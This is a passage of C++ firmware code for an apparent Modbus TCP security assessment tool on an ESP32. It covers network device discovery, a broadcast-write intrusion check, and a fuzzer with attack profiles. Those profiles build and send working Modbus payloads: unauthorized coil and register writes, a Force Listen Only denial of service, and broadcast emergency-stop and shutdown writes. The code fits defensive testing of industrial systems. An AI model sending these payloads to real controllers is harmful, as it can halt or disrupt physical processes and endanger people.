                      reading_data.coils_read_success ? "OK" : "NO", reading_data.coils_data,
                      reading_data.holding_registers_read_success ? "OK" : "NO", reading_data.holding_reg0, reading_data.holding_reg1);
        } else {
            // Even if no Modbus responses, add empty reading_data section for consistency
            cJSON* reading_data_json = cJSON_CreateObject();
            cJSON_AddItemToObject(device_entry, "reading_data", reading_data_json);

            LOG_INFOF(TAG_MB, "?? %s: TCP responsive but no Modbus responses - still a discovered device!", ip.c_str());
        }

        // Small delay between individual hosts within batch
        vTaskDelay(pdMS_TO_TICKS(20)); // respiro tra host
        ++i;
        }

        // Delay between batches for memory recovery and socket pool cleanup
        if (batch_end < ips_to_scan.size()) {

            LOG_INFOF(TAG_MB, "? Batch completed, waiting %dms for socket cleanup (WDT reset)...", BATCH_DELAY_MS);
            vTaskDelay(pdMS_TO_TICKS(BATCH_DELAY_MS));

            // Force garbage collection and socket cleanup
            size_t free_heap = heap_caps_get_free_size(MALLOC_CAP_INTERNAL);
            LOG_INFOF(TAG_MB, "?? Memory status: %u bytes free internal RAM, continuing batch %zu/%zu",
                      (unsigned)free_heap, (batch_start/BATCH_SIZE) + 2, (ips_to_scan.size() + BATCH_SIZE - 1) / BATCH_SIZE);
        }
    }

    cJSON_AddItemToObject(root, "devices", devices);
    cJSON_AddNumberToObject(root, "total_found", devices_found);
    cJSON_AddStringToObject(root, "method", "device_id_scan");
    cJSON_AddNumberToObject(root, "timeout_ms", timeout_ms);
    // Parametri applicati
    cJSON* params = cJSON_CreateObject();
    cJSON_AddNumberToObject(params, "port", port);
    cJSON_AddNumberToObject(params, "per_host_timeout_ms", per_host_timeout_ms);
    cJSON_AddNumberToObject(params, "connect_timeout_ms", connect_timeout_ms);
    cJSON_AddNumberToObject(params, "request_retries", request_retries);
    cJSON_AddNumberToObject(params, "connect_retries", connect_retries);
    cJSON_AddBoolToObject(params, "prescan_enabled", prescan_enabled);
    cJSON_AddNumberToObject(params, "prescan_timeout_ms", prescan_timeout_ms);
    cJSON_AddNumberToObject(params, "quick_timeout_ms", quick_timeout_ms);
    cJSON_AddNumberToObject(params, "probe_unit_limit", probe_unit_limit);
    cJSON_AddNumberToObject(params, "hosts_enumerated", (int)ips_to_scan.size());
    cJSON_AddNumberToObject(params, "hosts_scanned", hosts_scanned);
    cJSON_AddNumberToObject(params, "hosts_connected", hosts_connected);
    cJSON_AddNumberToObject(params, "connect_fail", connect_fail);
    cJSON_AddNumberToObject(params, "responses_mei", responses_mei);
    cJSON_AddNumberToObject(params, "responses_probe", responses_probe);
    cJSON* units = cJSON_CreateArray();
    for (auto u : units_default) cJSON_AddItemToArray(units, cJSON_CreateNumber(u));
    cJSON_AddItemToObject(params, "unit_ids_tried", units);
    cJSON_AddItemToObject(root, "params", params);
    uint64_t t1_ms = (uint64_t)(esp_timer_get_time() / 1000ULL);
    cJSON_AddNumberToObject(root, "scan_time_ms", (double)(t1_ms - t0_ms));
    if (bound_ip_str[0]) cJSON_AddStringToObject(params, "bound_local_ip", bound_ip_str);
    char* json = cJSON_PrintUnformatted(root);
    if (json && rep_) {
        psram_string type = PSRAMUtils::createPSRAMString("modbus_discovery");
        psram_string payload = PSRAMUtils::createPSRAMString(json);
        rep_->reportEvent(type, payload);
    }
    std::string out = json ? std::string(json) : std::string("{}");
    if (json) free(json);
    // Also notify progress channel with completed event
    if (rep_) {
        LOG_INFOF(TAG_MB, "?? Sending final discovery completion event (WDT reset)");
        cJSON* ev = cJSON_CreateObject();
        cJSON_AddStringToObject(ev, "event", "completed");
        cJSON_AddStringToObject(ev, "target", target_network.c_str());
        cJSON_AddNumberToObject(ev, "found", devices_found);
        cJSON_AddNumberToObject(ev, "hosts_scanned", hosts_scanned);
        cJSON_AddNumberToObject(ev, "hosts_connected", hosts_connected);
        cJSON_AddNumberToObject(ev, "responses_mei", responses_mei);
        cJSON_AddNumberToObject(ev, "responses_probe", responses_probe);
        char* js = cJSON_PrintUnformatted(ev);
        if (js) {
            psram_string type = PSRAMUtils::createPSRAMString("modbus_discovery_progress");
            psram_string payload = PSRAMUtils::createPSRAMString(js);
            rep_->reportEvent(type, payload);
            free(js);
        }
        cJSON_Delete(ev);
    }
    cJSON_Delete(root);
    return out;
}

bool ModbusTCPPlugin::doPacketAnalysis(const NetworkPacket& pkt) {
    const uint8_t* p = nullptr;
    size_t p_len = 0;
    if (!locateModbusAdu(pkt, p, p_len) || p_len < 8) return false;

    // ===== FLOW MANAGEMENT: Track the packet in the flow tracking system =====
    trackPacketInFlow(pkt);

    bool alert_generated = false;

    // Added from checkPacket - Real-time IDS analysis
    if (p && p_len > 0) {
        // Convert IP strings to uint32_t for IDS check
        uint32_t src_ip = 0, dst_ip = 0;
        if (!pkt.src_ip.empty()) {
            inet_aton(pkt.src_ip.c_str(), (struct in_addr*)&src_ip);
        }
        if (!pkt.dst_ip.empty()) {
            inet_aton(pkt.dst_ip.c_str(), (struct in_addr*)&dst_ip);
        }

        uint32_t now_ms = (uint32_t)(esp_timer_get_time() / 1000ULL);

        // Extract basic Modbus fields from MBAP/PDU
        if (p_len >= 8) {
            uint8_t unit_id = p[6];  // Unit ID at offset 6 in MBAP
            uint8_t func = p[7];     // Function code at offset 7

            // For broadcast write detection
            uint16_t start = 0, qty = 0;
            if (p_len >= 12) {
                start = (p[8] << 8) | p[9];
                qty = (p[10] << 8) | p[11];
            }

            // Check for broadcast writes
            if (alert_broadcast_write_ && checkBroadcastWrite(unit_id, func)) {
                std::stringstream ss;
                ss << "{\"alert_type\":\"broadcast_write\",\"protocol\":\"modbus\",\"src_ip\":\""
                   << pkt.src_ip << "\",\"dst_ip\":\"" << pkt.dst_ip
                   << "\",\"unit_id\":" << (int)unit_id
                   << ",\"function_code\":" << (int)func
                   << ",\"start_address\":" << start
                   << ",\"quantity\":" << qty
                   << ",\"timestamp\":" << now_ms << "}";

                std::string payload_str = ss.str();
                reportIntrusionPSRAM(pkt, PSRAMUtils::createPSRAMString(payload_str.c_str()), LogLevel::WARNING);
                alert_generated = true;
            }
        }
    }

    return alert_generated;
}

void ModbusTCPPlugin::loadIDSRules(const std::string& rules_json) {
    // Very small loader for allowed_writers from rules JSON (array of strings).
    if (rules_json.empty()) return;
    // crude parse: look for "allowed_writers": ["ip1","ip2"]
    cfg_.allowed_writers.clear();
    size_t pos = rules_json.find("allowed_writers");
    if (pos!=std::string::npos) {
        size_t lb = rules_json.find('[', pos);
        size_t rb = rules_json.find(']', lb);
        if (lb!=std::string::npos && rb!=std::string::npos) {
            std::string arr = rules_json.substr(lb+1, rb-lb-1);
            std::stringstream ss(arr);
            std::string tok;
            while(std::getline(ss, tok, ',')) {
                // remove quotes and spaces
                tok.erase(std::remove(tok.begin(), tok.end(), '\"'), tok.end());
                tok.erase(std::remove(tok.begin(), tok.end(), ' '), tok.end());
                if (!tok.empty()) cfg_.allowed_writers.push_back(tok);
            }
        }
    }
}

// ======== IDS Methods (consolidated from ModbusIntrusionDetection) ========

bool ModbusTCPPlugin::checkBroadcastWrite(uint8_t unit_id, uint8_t func) {
    // Unit ID 0 is broadcast, check if it's a write function
    return (unit_id == 0) && isWriteFunction(func);
}

bool ModbusTCPPlugin::isWriteFunction(uint8_t func) const {
    // Modbus write function codes
    switch (func) {
        case 5:  // Write Single Coil
        case 6:  // Write Single Register
        case 15: // Write Multiple Coils
        case 16: // Write Multiple Registers
        case 21: // Write File Record
        case 22: // Mask Write
        case 23: // Read/Write Multiple Registers (write portion)
            return true;
        default:
            return false;
    }
}

// ======== Fuzzing Methods (consolidated from ModbusFuzzTarget) ========

bool ModbusTCPPlugin::generateSeedCorpus(const FuzzJob& job, std::vector<FuzzTestCase>& out) {
    LOG_INFOF(TAG_MB, "?? MODBUS FUZZER: Generating seed corpus for job %lu, profile: %s",
             (unsigned long)job.id, job.profile.empty() ? "default" : job.profile.c_str());

    // Check if specialized attack profile is requested
    if (!job.profile.empty() && job.profile != "default") {
        generateAttackSeeds(job, job.profile, out);
        if (!out.empty()) {
            return true;
        }
    }

    // Standard fuzzing seeds (Basic mode)
    const uint8_t read_seeds[][12] = {
        // MBAP (7) + PDU: Read Coils (1) start=0 qty=16
        {0x00,0x01, 0x00,0x00, 0x00,0x06, 0x01, 0x01, 0x00,0x00, 0x00,0x10},
        // MBAP + Read Holding Registers (3) start=0 qty=4
        {0x00,0x02, 0x00,0x00, 0x00,0x06, 0x01, 0x03, 0x00,0x00, 0x00,0x04},
        // MBAP + Read Input Registers (4) start=0 qty=8
        {0x00,0x03, 0x00,0x00, 0x00,0x06, 0x01, 0x04, 0x00,0x00, 0x00,0x08},
        // MBAP + Read Discrete Inputs (2) start=0 qty=8
        {0x00,0x04, 0x00,0x00, 0x00,0x06, 0x01, 0x02, 0x00,0x00, 0x00,0x08}
    };

    for (auto& s : read_seeds) {
        FuzzTestCase tc;
        tc.payload.assign(s, s+sizeof(read_seeds[0]));
        tc.seed_id = out.size() + 1; // Track seed type
        out.push_back(tc);
    }

    // Write operations seeds (only if not in safe mode)
    if (!job.safe_mode) {
        const uint8_t write_seeds[][12] = {
            // MBAP + Write Single Coil (5) addr=0 value=0xFF00 (ON)
            {0x00,0x05, 0x00,0x00, 0x00,0x06, 0x01, 0x05, 0x00,0x00, 0xFF,0x00},
            // MBAP + Write Single Register (6) addr=0 value=random (will be randomized)
            {0x00,0x06, 0x00,0x00, 0x00,0x06, 0x01, 0x06, 0x00,0x00, 0x12,0x34},
            // MBAP + Write Single Register (6) addr=1 value=random
            {0x00,0x07, 0x00,0x00, 0x00,0x06, 0x01, 0x06, 0x00,0x01, 0x56,0x78},
            // MBAP + Write Single Register (6) addr=10 value=random
            {0x00,0x08, 0x00,0x00, 0x00,0x06, 0x01, 0x06, 0x00,0x0A, 0x9A,0xBC}
        };

        for (auto& s : write_seeds) {
            FuzzTestCase tc;
            tc.payload.assign(s, s+sizeof(write_seeds[0]));
            tc.seed_id = out.size() + 1 + 100; // Mark as write seeds (100+)
            out.push_back(tc);
        }
    }

    return !out.empty();
}

bool ModbusTCPPlugin::fixup(const FuzzJob& job, const FuzzTestCase& in, FuzzTestCase& out) {
    out = in; // Start with input

    // Basic MBAP fixup: ensure length field is correct
    if (out.payload.size() >= 6) {
        uint16_t len = out.payload.size() - 6; // Length after MBAP header
        out.payload[4] = (len >> 8) & 0xFF;
        out.payload[5] = len & 0xFF;
    }

    // Randomize some values for variability
    if (out.payload.size() >= 12 && out.seed_id >= 100) { // Write operations
        // Randomize register values for write operations
        out.payload[10] = esp_random() & 0xFF;
        out.payload[11] = esp_random() & 0xFF;
    }

    return true;
}

FuzzResult ModbusTCPPlugin::execute(const FuzzJob& job, const FuzzTestCase& tc,
                                    std::string& sent_hex, std::string& received_hex,
                                    std::string& status_details) {
    // Set sent packet hex immediately
    sent_hex = bytesToHex(tc.payload);
    received_hex.clear();
    status_details.clear();

    // Parse target (format: ip:port or just ip, defaults to port 502)
    std::string host;
    uint16_t port = 502;
    size_t colon = job.target.find(':');
    if (colon != std::string::npos) {
        host = job.target.substr(0, colon);
        port = std::stoi(job.target.substr(colon + 1));
    } else {
        host = job.target;
    }

    // Try to connect and send the test case
    int sock = AssessmentInterface::openBoundSocket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        status_details = "socket_creation_failed errno:" + std::to_string(errno);
        return FuzzResult::SOCKET_ERROR;
    }

    configureTcpSocket(sock);

    // Set socket timeout
    struct timeval tv;
    tv.tv_sec = 5;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    // Bind to Ethernet interface (ETH_DEF)
    esp_netif_t* eth = esp_netif_get_handle_from_ifkey("ETH_DEF");
    esp_netif_ip_info_t eth_ip{};
    if (!eth || esp_netif_get_ip_info(eth, &eth_ip) != ESP_OK || eth_ip.ip.addr == 0) {
        close(sock); status_details = "ethernet_not_ready"; return FuzzResult::CONNECTION_FAILED;
    }
#ifdef SO_BINDTODEVICE
    {
        struct ifreq ifr;
        if_indextoname(esp_netif_get_netif_impl_index(eth), ifr.ifr_name);
        (void)setsockopt(sock, SOL_SOCKET, SO_BINDTODEVICE, (void*)&ifr, sizeof(struct ifreq));
    }
#endif
        // Local bind to Ethernet IP is sufficient to select the interface

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    if (inet_aton(host.c_str(), &addr.sin_addr) == 0) {
        // Close leaked socket on invalid target to avoid ENFILE (errno 23)
        close(sock);
        status_details = "invalid_ip_address";
        return FuzzResult::CONNECTION_FAILED;
    }

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sock);
        status_details = "connection_failed errno:" + std::to_string(errno);
        return FuzzResult::CONNECTION_FAILED;
    }

    // Send the payload
    ssize_t sent = send(sock, tc.payload.data(), tc.payload.size(), 0);
    if (sent <= 0) {
        close(sock);
        status_details = "send_failed bytes_sent:" + std::to_string(sent);
        return FuzzResult::SEND_FAILED;
    }

    // Try to receive response
    uint8_t response[256];
    ssize_t recv_len = recv(sock, response, sizeof(response), 0);

    close(sock);

    if (recv_len > 0) {
        // Set received packet hex
        std::vector<uint8_t> response_vec(response, response + recv_len);
        received_hex = bytesToHex(response_vec);

        // Parse response details
        std::stringstream details;
        details << "bytes_received:" << recv_len;

        if (recv_len >= 2) {
            uint8_t function_code = response[1];
            details << " function_code:" << (int)function_code;

            // Check for exception response
            if (recv_len >= 3 && (function_code & 0x80)) {
                uint8_t exception_code = response[2];
                details << " exception_code:" << (int)exception_code;
                status_details = details.str();
                return FuzzResult::EXCEPTION_RESPONSE;
            }
        }

        status_details = details.str();
        return FuzzResult::SUCCESS;

    } else if (recv_len == 0) {
        status_details = "connection_closed_by_peer";
        return FuzzResult::TIMEOUT;
    } else {
        status_details = "recv_timeout_or_error errno:" + std::to_string(errno);
        return FuzzResult::TIMEOUT;
    }
}

// ======== Advanced Fuzzing Methods (from fuzz_targets integration) ========

ModbusAttackConfig ModbusTCPPlugin::parseAttackConfig(const FuzzJob& job) {
    ModbusAttackConfig config;

    // Parse attack type from profile string
    if (job.profile == "unauthorized_writes") {
        config.attack_type = ModbusAttackType::UNAUTHORIZED_WRITES;
    } else if (job.profile == "dos_listen_only") {
        config.attack_type = ModbusAttackType::DOS_LISTEN_ONLY;
    } else if (job.profile == "broadcast_attacks") {
        config.attack_type = ModbusAttackType::BROADCAST_ATTACKS;
    } else if (job.profile == "device_discovery") {
        config.attack_type = ModbusAttackType::DEVICE_DISCOVERY;
    } else if (job.profile == "vulnerability_exploits") {
        config.attack_type = ModbusAttackType::VULNERABILITY_EXPLOITS;
    } else {
        config.attack_type = ModbusAttackType::BASIC_FUZZING;
    }

    // Parse additional parameters from job.extra_config (JSON format)
    if (!job.extra_config.empty()) {
        cJSON* root = cJSON_Parse(job.extra_config.c_str());
        if (root) {
            // Parse critical_registers array
            cJSON* critical_regs = cJSON_GetObjectItem(root, "critical_registers");
            if (critical_regs && cJSON_IsArray(critical_regs)) {
                cJSON* reg = nullptr;
                cJSON_ArrayForEach(reg, critical_regs) {
                    if (cJSON_IsNumber(reg)) {
                        config.critical_registers.push_back(static_cast<uint16_t>(reg->valueint));
                    }
                }
                LOG_DEBUGF(TAG_MB, "Parsed %u critical registers from extra_config",
                          (unsigned)config.critical_registers.size());
            }

            // Parse unit_id_range object
            cJSON* unit_range = cJSON_GetObjectItem(root, "unit_id_range");
            if (unit_range && cJSON_IsObject(unit_range)) {
                cJSON* min_id = cJSON_GetObjectItem(unit_range, "min");
                cJSON* max_id = cJSON_GetObjectItem(unit_range, "max");
                if (min_id && cJSON_IsNumber(min_id) && max_id && cJSON_IsNumber(max_id)) {
                    uint8_t min_val = static_cast<uint8_t>(min_id->valueint);
                    uint8_t max_val = static_cast<uint8_t>(max_id->valueint);
                    // Populate range
                    for (uint8_t id = min_val; id <= max_val; ++id) {
                        config.unit_id_range.push_back(id);
                    }
                    LOG_DEBUGF(TAG_MB, "Parsed unit_id_range: %u-%u (%u IDs)",
                              min_val, max_val, (unsigned)config.unit_id_range.size());
                }
            }

            // Parse timing_delay_ms
            cJSON* timing_delay = cJSON_GetObjectItem(root, "timing_delay_ms");
            if (timing_delay && cJSON_IsNumber(timing_delay)) {
                config.timing_delay_ms = static_cast<uint32_t>(timing_delay->valueint);
                LOG_DEBUGF(TAG_MB, "Parsed timing_delay_ms: %u", config.timing_delay_ms);
            }

            // Parse stealth_mode (optional)
            cJSON* stealth = cJSON_GetObjectItem(root, "stealth_mode");
            if (stealth && cJSON_IsBool(stealth)) {
                config.stealth_mode = cJSON_IsTrue(stealth);
                LOG_DEBUGF(TAG_MB, "Parsed stealth_mode: %s", config.stealth_mode ? "true" : "false");
            }

            // Parse discovery_depth (optional)
            cJSON* discovery = cJSON_GetObjectItem(root, "discovery_depth");
            if (discovery && cJSON_IsString(discovery)) {
                config.discovery_depth = discovery->valuestring;
                LOG_DEBUGF(TAG_MB, "Parsed discovery_depth: %s", config.discovery_depth.c_str());
            }

            // Parse force_broadcast (optional)
            cJSON* broadcast = cJSON_GetObjectItem(root, "force_broadcast");
            if (broadcast && cJSON_IsBool(broadcast)) {
                config.force_broadcast = cJSON_IsTrue(broadcast);
                LOG_DEBUGF(TAG_MB, "Parsed force_broadcast: %s", config.force_broadcast ? "true" : "false");
            }

            cJSON_Delete(root);
        } else {
            LOG_WARNING(TAG_MB, "Failed to parse extra_config JSON - using defaults");
        }
    }

    return config;
}

bool ModbusTCPPlugin::generateAttackSeeds(const FuzzJob& job, ModbusAttackType attack_type, std::vector<FuzzTestCase>& out) {

    ModbusAttackConfig config = parseAttackConfig(job);
    auto profile = createAttackProfile(attack_type);

    if (!profile) {
        LOG_WARNING(TAG_MB, "Failed to create attack profile for type");
        return false;
    }

    std::vector<std::vector<uint8_t>> seeds;
    if (!profile->generateSeeds(config, seeds)) {
        LOG_WARNING(TAG_MB, "Attack profile failed to generate seeds");
        return false;
    }

    // Convert vector<vector<uint8_t>> to vector<FuzzTestCase>
    for (size_t i = 0; i < seeds.size(); ++i) {
        FuzzTestCase tc;
        tc.payload = seeds[i];
        tc.seed_id = 4000 + (int)attack_type * 1000 + i; // Unique seed IDs per attack type
        out.push_back(tc);
    }

    return !out.empty();
}

// createAttackProfile moved after class implementations

void ModbusTCPPlugin::generateAttackSeeds(const FuzzJob& job, const std::string& attack_type, std::vector<FuzzTestCase>& out) {

    // Convert string to enum and use advanced attack profiles
    ModbusAttackType type = ModbusAttackType::BASIC_FUZZING;
    if (attack_type == "unauthorized_writes") {
        type = ModbusAttackType::UNAUTHORIZED_WRITES;
    } else if (attack_type == "broadcast_attacks") {
        type = ModbusAttackType::BROADCAST_ATTACKS;
    } else if (attack_type == "dos_listen_only") {
        type = ModbusAttackType::DOS_LISTEN_ONLY;
    } else if (attack_type == "device_discovery") {
        type = ModbusAttackType::DEVICE_DISCOVERY;
    } else if (attack_type == "vulnerability_exploits") {
        type = ModbusAttackType::VULNERABILITY_EXPLOITS;
    }

    if (type != ModbusAttackType::BASIC_FUZZING) {
        generateAttackSeeds(job, type, out);
        return;
    }

    // Fallback to simple implementation for basic fuzzing
    if (attack_type == "unauthorized_writes") {
        // Generate write commands to critical registers
        const uint16_t critical_regs[] = {0, 1, 10, 100, 1000};
        for (uint16_t reg : critical_regs) {
            FuzzTestCase tc;
            // MBAP + Write Single Register
            tc.payload = {
                0x00, 0x01,           // Transaction ID
                0x00, 0x00,           // Protocol ID
                0x00, 0x06,           // Length
                0x01,                 // Unit ID
                0x06,                 // Function: Write Single Register
                (uint8_t)(reg >> 8), (uint8_t)(reg & 0xFF),  // Register address
                0xFF, 0xFF            // Value (will trigger alerts)
            };
            tc.seed_id = 2000 + reg;
            out.push_back(tc);
        }
    } else if (attack_type == "broadcast_attacks") {
        // Generate broadcast write commands (Unit ID = 0)
        FuzzTestCase tc;
        tc.payload = {
            0x00, 0x01,           // Transaction ID
            0x00, 0x00,           // Protocol ID
            0x00, 0x06,           // Length
            0x00,                 // Unit ID = 0 (BROADCAST)
            0x06,                 // Function: Write Single Register
            0x00, 0x00,           // Register 0
            0xDE, 0xAD            // Suspicious value
        };
        tc.seed_id = 3000;
        out.push_back(tc);
    }

}

// ======== Attack Profile Classes Implementation ========

// Helper functions (from modbus_attack_profiles.cpp)

static inline uint16_t be16(const uint8_t* p) { return (uint16_t)((p[0]<<8)|p[1]); }
static inline void wr16(uint8_t* p, uint16_t v) { p[0]=(uint8_t)(v>>8); p[1]=(uint8_t)(v&0xFF); }


// UnauthorizedWritesProfile implementation
class ModbusTCPPlugin::UnauthorizedWritesProfile : public ModbusAttackProfile {
public:
    ModbusAttackType getType() const override { return ModbusAttackType::UNAUTHORIZED_WRITES; }

    bool generateSeeds(const ModbusAttackConfig& config, std::vector<std::vector<uint8_t>>& seeds) override {
        seeds.clear();

        // Write Single Coil (FC 0x05) - Basic single coil operations
        seeds.push_back(createWriteSingleCoil(0, true));   // Coil 0 ON
        seeds.push_back(createWriteSingleCoil(0, false));  // Coil 0 OFF
        seeds.push_back(createWriteSingleCoil(10, true));  // Coil 10 ON
        seeds.push_back(createWriteSingleCoil(173, true)); // Coil 173 ON (from spec example)

        // Write Single Register (FC 0x06) - Single register operations
        seeds.push_back(createWriteSingleRegister(0, 0x0003));    // Register 0 = 3 (from spec example)
        seeds.push_back(createWriteSingleRegister(1, 0x0003));    // Register 1 = 3 (40002 from spec)
        seeds.push_back(createWriteSingleRegister(0, 0xFFFF));    // Register 0 = MAX
        seeds.push_back(createWriteSingleRegister(100, 0x8000));  // Register 100 = dangerous value

        // Write Multiple Registers (FC 0x10) - Multiple set-point change
        std::vector<uint16_t> critical_values = {0xFFFF, 0x0000, 0x8000, 0x7FFF}; // Critical values
        seeds.push_back(createWriteMultipleRegisters(0, critical_values));

        return !seeds.empty();
    }

    std::string executeAttack(const std::string& target, const std::vector<uint8_t>& payload) override {
        return executeNetworkAttack(target, payload);
    }

    void parseAttackResponse(const std::vector<uint8_t>& response, const std::vector<uint8_t>& request, std::string& result_json) override {
        std::stringstream result;
        result << "{\"attack_type\":\"unauthorized_writes\"";

        if (response.size() >= 8 && request.size() >= 8) {
            uint8_t req_fc = request[7];
            uint8_t resp_fc = response[7];

            result << ",\"request_function_code\":" << (int)req_fc;

            if (resp_fc & 0x80) {
                // Exception response
                if (response.size() >= 9) {
                    uint8_t exception_code = response[8];
                    result << ",\"response\":\"exception\",\"exception_code\":" << (int)exception_code;
                    result << ",\"attack_impact\":\"blocked\"";
                }
            } else {
                // Success response
                result << ",\"response\":\"success\",\"attack_impact\":\"executed\"";
            }
        }

        result << "}";
        result_json = result.str();
    }

private:
    // Create Write Single Coil packet (FC 0x05)
    std::vector<uint8_t> createWriteSingleCoil(uint16_t coil_addr, bool value) {
        std::vector<uint8_t> pdu;

        // MBAP Header (7 bytes total)
        pdu.push_back(0x00); pdu.push_back(0x01); // Transaction ID
        pdu.push_back(0x00); pdu.push_back(0x00); // Protocol ID
        pdu.push_back(0x00); pdu.push_back(0x06); // Length
        pdu.push_back(0x01); // Unit ID
        pdu.push_back(0x05); // Function Code: Write Single Coil

        // Coil address and value
        pdu.push_back((coil_addr >> 8) & 0xFF);
        pdu.push_back(coil_addr & 0xFF);

        // Coil value (2 bytes: 0xFF00 = ON, 0x0000 = OFF)
        if (value) {
            pdu.push_back(0xFF); pdu.push_back(0x00);
        } else {
            pdu.push_back(0x00); pdu.push_back(0x00);
        }

        return pdu;
    }

    std::vector<uint8_t> createWriteSingleRegister(uint16_t reg_addr, uint16_t value) {
        std::vector<uint8_t> adu = {0x00,0x01, 0x00,0x00, 0x00,0x06, 0x01, 0x06};
        adu.push_back(uint8_t(reg_addr>>8)); adu.push_back(uint8_t(reg_addr));
        adu.push_back(uint8_t(value>>8));    adu.push_back(uint8_t(value));
        return adu;
    }

    std::vector<uint8_t> createWriteMultipleRegisters(uint16_t start_addr, const std::vector<uint16_t>& values) {
        std::vector<uint8_t> adu = {0x00,0x01, 0x00,0x00, 0x00,0x00, 0x01, 0x10};
        adu.push_back(uint8_t(start_addr>>8)); adu.push_back(uint8_t(start_addr));

        uint16_t quantity = values.size();
        adu.push_back(uint8_t(quantity>>8)); adu.push_back(uint8_t(quantity));
        adu.push_back(uint8_t(quantity * 2)); // 2 bytes per register

        for (uint16_t v : values) {
            adu.push_back(uint8_t(v>>8)); adu.push_back(uint8_t(v));
        }

        uint16_t mbap_length = adu.size() - 6;
        adu[4] = uint8_t(mbap_length>>8);
        adu[5] = uint8_t(mbap_length);
        return adu;
    }
};

// DoSListenOnlyProfile implementation
class ModbusTCPPlugin::DoSListenOnlyProfile : public ModbusAttackProfile {
public:
    ModbusAttackType getType() const override { return ModbusAttackType::DOS_LISTEN_ONLY; }

    bool generateSeeds(const ModbusAttackConfig& config, std::vector<std::vector<uint8_t>>& seeds) override {
        seeds.clear();

        uint8_t unit_id = 1;

        // Sub-function 0x0004: Force Listen Only Mode (main DoS)
        seeds.push_back(createDiagnostics(unit_id, 0x0004, 0x0000));

        // Sub-function 0x0001: Return Query Data (diagnostic tests)
        seeds.push_back(createDiagnostics(unit_id, 0x0001, 0x1234));

        // Sub-function 0x0002: Restart Communications Option
        seeds.push_back(createDiagnostics(unit_id, 0x0002, 0x00FF));

        return !seeds.empty();
    }

    std::string executeAttack(const std::string& target, const std::vector<uint8_t>& payload) override {
        return executeNetworkAttack(target, payload);
    }

    void parseAttackResponse(const std::vector<uint8_t>& response, const std::vector<uint8_t>& request, std::string& result_json) override {
        std::stringstream result;
        result << "{\"attack_type\":\"dos_listen_only\"";

        if (request.size() >= 10) {
            uint16_t sub_function = be16(&request[8]);
            result << ",\"diagnostics_subfunction\":" << sub_function;

            if (sub_function == 0x0004) {
                result << ",\"severity\":\"CRITICAL\"";
                result << ",\"impact_description\":\"Device may stop responding until restart\"";
            }
        }

        if (response.empty()) {
            result << ",\"response\":\"no_response\"";
            result << ",\"dos_success\":\"likely\"";
        }

        result << "}";
        result_json = result.str();
    }

private:
    std::vector<uint8_t> createDiagnostics(uint8_t unit_id, uint16_t sub_function, uint16_t data) {
        return {
            0x00, 0x01,        // Transaction ID
            0x00, 0x00,        // Protocol ID
            0x00, 0x06,        // Length
            unit_id,           // Unit ID
            0x08,              // Function Code: Diagnostics
            (uint8_t)((sub_function >> 8) & 0xFF), (uint8_t)(sub_function & 0xFF),
            (uint8_t)((data >> 8) & 0xFF), (uint8_t)(data & 0xFF)
        };
    }
};

// BroadcastAttacksProfile implementation
class ModbusTCPPlugin::BroadcastAttacksProfile : public ModbusAttackProfile {
public:
    ModbusAttackType getType() const override { return ModbusAttackType::BROADCAST_ATTACKS; }

    bool generateSeeds(const ModbusAttackConfig& config, std::vector<std::vector<uint8_t>>& seeds) override {
        seeds.clear();

        // Broadcast Write Single Coil - Emergency stop/start
        std::vector<uint8_t> broadcast_coil_on = {
            0x00, 0x01,        // Transaction ID
            0x00, 0x00,        // Protocol ID
            0x00, 0x06,        // Length
            0x00,              // Unit ID: 0 = BROADCAST
            0x05,              // Function Code: Write Single Coil
            0x00, 0x00,        // Coil Address: 0 (Emergency Stop)
            0xFF, 0x00         // Value: ON
        };
        seeds.push_back(broadcast_coil_on);

        // Broadcast Write Single Register - Set-point massivo
        std::vector<uint8_t> broadcast_reg_zero = {
            0x00, 0x02,        // Transaction ID
            0x00, 0x00,        // Protocol ID
            0x00, 0x06,        // Length
            0x00,              // Unit ID: 0 = BROADCAST
            0x06,              // Function Code: Write Single Register
            0x00, 0x64,        // Register Address: 100 (common setpoint)
            0x00, 0x00         // Value: 0 (shutdown)
        };
        seeds.push_back(broadcast_reg_zero);

        return !seeds.empty();
    }

    std::string executeAttack(const std::string& target, const std::vector<uint8_t>& payload) override {
        return executeNetworkAttack(target, payload);
    }

    void parseAttackResponse(const std::vector<uint8_t>& response, const std::vector<uint8_t>& request, std::string& result_json) override {
        std::stringstream result;
        result << "{\"attack_type\":\"broadcast_attack\",\"unit_id\":0";
        result << ",\"stealth_mode\":true";

        if (response.empty()) {
            result << ",\"broadcast_success\":\"likely\"";
            result << ",\"impact\":\"Multiple devices affected silently\"";
        } else {
            result << ",\"broadcast_success\":\"unexpected_response\"";
            result << ",\"note\":\"Device responded to broadcast (unusual)\"";
        }

        result << "}";
        result_json = result.str();
    }
};

// DeviceDiscoveryProfile implementation
class ModbusTCPPlugin::DeviceDiscoveryProfile : public ModbusAttackProfile {
public:
    ModbusAttackType getType() const override { return ModbusAttackType::DEVICE_DISCOVERY; }

    bool generateSeeds(const ModbusAttackConfig& config, std::vector<std::vector<uint8_t>>& seeds) override {
        seeds.clear();

        // Default range: 1-10 for focused discovery
        for (uint8_t unit_id = 1; unit_id <= 10; ++unit_id) {
            // Basic Unit ID probe (simple read)
            seeds.push_back(createUnitIdProbe(unit_id));

            // Read Device Identification - Basic
            seeds.push_back(createReadDeviceId(unit_id, 0x01, 0x00)); // Vendor Name
            seeds.push_back(createReadDeviceId(unit_id, 0x01, 0x01)); // Product Code
            seeds.push_back(createReadDeviceId(unit_id, 0x01, 0x02)); // Major/Minor Version
        }

        return !seeds.empty();
    }

    std::string executeAttack(const std::string& target, const std::vector<uint8_t>& payload) override {
        return executeNetworkAttack(target, payload);
    }

    void parseAttackResponse(const std::vector<uint8_t>& response, const std::vector<uint8_t>& request, std::string& result_json) override {
        std::stringstream result;
        result << "{\"attack_type\":\"device_discovery\"";

        if (request.size() >= 7) {
            uint8_t unit_id = request[6];
            result << ",\"unit_id\":" << (int)unit_id;
        }

        if (response.empty()) {
            result << ",\"device_present\":false";
        } else if (response.size() >= 8) {
            uint8_t resp_fc = response[7];
            if (resp_fc & 0x80) {
